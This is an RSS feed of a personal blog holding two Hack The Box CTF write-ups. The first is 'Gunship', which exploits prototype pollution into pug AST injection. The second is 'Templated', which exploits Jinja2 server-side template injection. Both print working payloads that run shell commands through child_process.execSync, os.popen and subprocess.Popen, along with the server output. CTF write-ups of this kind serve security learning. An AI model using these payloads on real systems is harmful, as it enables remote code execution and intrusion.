@@ -1,0 +1,167 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Harshit Maheshwari</title>
+        <link>https://harshitm98.github.io/posts/</link>
+        <description>Recent content in Posts on Harshit Maheshwari</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Mon, 27 Dec 2021 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://harshitm98.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB Gunship - Writeup</title>
+            <link>https://harshitm98.github.io/posts/htb-challenge-gunship/</link>
+            <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://harshitm98.github.io/posts/htb-challenge-gunship/</guid>
+            <description>Access details -&amp;gt; 159.65.31.1:32618
+We are provided with a website which has only one input field and we have the source code available.
+So let&amp;rsquo;s go through the source code which is made available to us.
+Quick Recon   Packages installed (package.json)
+&amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  - We have `pug:3.0.0` which is vulnerable to RCE.- Source: https://github.com/pugjs/pug/issues/3312  Location of vulnerability (routes/index.</description>
+            <content type="html"><![CDATA[<p>Access details -&gt; 159.65.31.1:32618</p>
+<p>We are provided with a website which has only one input field and we have the source code available.</p>
+<p>So let&rsquo;s go through the source code which is made available to us.</p>
+<h3 id="quick-recon">Quick Recon</h3>
+<ul>
+<li>
+<p>Packages installed (<code>package.json</code>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+    <span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^4.17.1&#34;</span>,
+    <span style="color:#f92672">&#34;flat&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
+    <span style="color:#f92672">&#34;pug&#34;</span>: <span style="color:#e6db74">&#34;^3.0.0&#34;</span>
+}
+</code></pre></div><pre><code>  - We have `pug:3.0.0` which is vulnerable to RCE.
+  - Source: https://github.com/pugjs/pug/issues/3312
+
+</code></pre></li>
+<li>
+<p>Location of vulnerability (<code>routes/index.js</code>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);
+
+...
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/submit&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">artist</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+  
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Haigh&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Westaway&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Gingell&#39;</span>)) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+            <span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">&#39;span Hello #{user}, thank you for letting us know!&#39;</span>)({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span> })
+        });
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+            <span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please provide us with the full name of an existing member.&#39;</span>
+        });
+    }
+});
+</code></pre></div><pre><code>
+</code></pre></li>
+<li>
+<p>Request submitted through <code>/api/submit</code> where body of the request(<code>req.body</code>) is passed to <code>unflatten</code>.</p>
+</li>
+<li>
+<p>So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.</p>
+</li>
+</ul>
+<h3 id="exploiting-the-bug">Exploiting the bug</h3>
+<ul>
+<li>We navigate to <code>/</code> (http://159.65.31.1:32618/) and then enter some random values, intercept the request in Burp.</li>
+<li>Modify the request of the body so it looks like:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /api/submit <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">159.65.31.1:32618</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">170</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309/</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-GB,en-US;q=0.9,en;q=0.8</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+
+{
+	<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
+	<span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
+	<span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(ls | grep flag)&#39;)&#34;</span>
+	}
+}
+</code></pre></div><ul>
+<li>Output:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(ls | grep flag)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: flagQLGyS: not found&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
+</code></pre></div><p><em>Note: We are running <code>$(ls |  grep flag)</code> instead of <code>ls | grep flag</code> because when the command executes without any error, we cannot see the output</em></p>
+<ul>
+<li>Now let&rsquo;s <code>cat</code> the file
+<ul>
+<li>Reques bodyt:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+    <span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
+    <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
+    <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(cat flagQLGyS)&#39;)&#34;</span>
+    }
+}
+</code></pre></div><pre><code></code></pre></li>
+<li>Output:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(cat flagQLGyS)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
+&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
+</code></pre></div><pre><code>
+</code></pre></li>
+</ul>
+<p>References:</p>
+<ul>
+<li>(Peak resource) <a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Templated - Writeup</title>
+            <link>https://harshitm98.github.io/posts/htb-challenge-templated/</link>
+            <pubDate>Sun, 26 Dec 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
+            <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
+![Pasted image 20211226121920.png](&amp;quot;/images/Pasted image 20211226121920.png&amp;quot;)
+Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
+![[Pasted image 20211226121844.png]]
+We know that it is Jinja2 and Flask, so we can use their payload.
+Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
+![[Pasted image 20211226182358.png]]
+Alternative Finding subprocess.Popen index.
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list !</description>
+            <content type="html"><![CDATA[<h2 id="navigating-through-the-website">Navigating through the website</h2>
+<p>Requested: <code>GET /invalid</code> -&gt; we got <code>invalid</code></p>
+<p>![Pasted image 20211226121920.png](&quot;/images/Pasted image 20211226121920.png&quot;)</p>
+<h2 id="verifying-if-ssti-is-possible">Verifying if SSTI is possible</h2>
+<p>Requested: <code>GET /invalid{{7*7}}</code> -&gt; we got <code>invalid49</code> instead of <code>invalid{{7*7}}</code></p>
+<p>![[Pasted image 20211226121844.png]]</p>
+<p>We know that it is Jinja2 and Flask, so we can use their payload.</p>
+<h2 id="getting-the-flag">Getting the flag</h2>
+<p>Requested: <code>GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}</code> -&gt; we got the flag</p>
+<p>![[Pasted image 20211226182358.png]]</p>
+<h3 id="alternative">Alternative</h3>
+<p><strong>Finding <code>subprocess.Popen</code> index.</strong></p>
+<ol>
+<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[100:]</code> -&gt; Popen is there in the list
+![[Pasted image 20211226184612.png]]</li>
+<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[300:]</code> -&gt; Popen is there in the list</li>
+<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[500:]</code> -&gt; Internal Server Error</li>
+<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[400:]</code> -&gt; Popen is there in the list</li>
+<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[450:]</code> -&gt; Popen is NOT there in the list</li>
+<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]</code> -&gt; Popen exists</li>
+</ol>
+<p><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
+<p>References:</p>
+<ul>
+<li><a href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a></li>
+<li><a href="https://blog.nvisium.com/p255">https://blog.nvisium.com/p255</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
+</ul>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
